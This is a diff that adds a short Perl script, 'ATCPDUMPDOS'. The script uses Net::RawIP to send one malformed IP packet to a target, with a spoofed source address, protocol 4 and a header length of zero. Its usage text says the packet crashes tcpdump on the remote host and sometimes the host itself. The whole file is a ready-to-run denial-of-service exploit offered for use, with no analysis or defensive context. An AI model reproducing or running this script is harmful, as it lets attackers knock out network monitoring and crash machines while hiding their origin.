@@ -1,0 +1,40 @@
+#!/usr/bin/perl
+
+use Getopt::Std;
+use Net::RawIP;
+
+getopts('s:h:', \%opt)||usage();
+if(defined($opt{'h'})) { $host=$opt{'h'} } else { usage() }
+if(defined($opt{'s'})) { $spoofed=$opt{'s'} } else { usage() }
+
+print("\nATCPDUMPDOS - Programmed by Anarchy\n");
+print("===================================\n");
+print("Constructing packet...");
+
+
+$packet=new Net::RawIP;
+$packet->set({ ip  => { ttl      => 64,
+                        protocol => 4,
+                        ihl      => 0,
+                        tos      => 0,
+                        saddr    => $spoofed,
+                        daddr    => $host
+                      },
+             });
+
+print("Done.\n");
+print("Sending packet to host: $host...");
+$packet->send();
+print("Done.\n\n");
+
+sub usage() {
+    $0=~s#.*/##g;
+    print("\nATCPDUMPDOS - Programmed by Anarchy\n");
+    print("===================================\n");
+    print("Usage: ATCPDUMPDOS -s <spoofed ip> -h <target>\n\n");
+    print("This will crash tcpdump running on the remote host.\n");
+    print("Sometimes you can even crash the remote host\n");
+    print("and not only tcpdump.\n\n");
+    exit 0;
+}
+
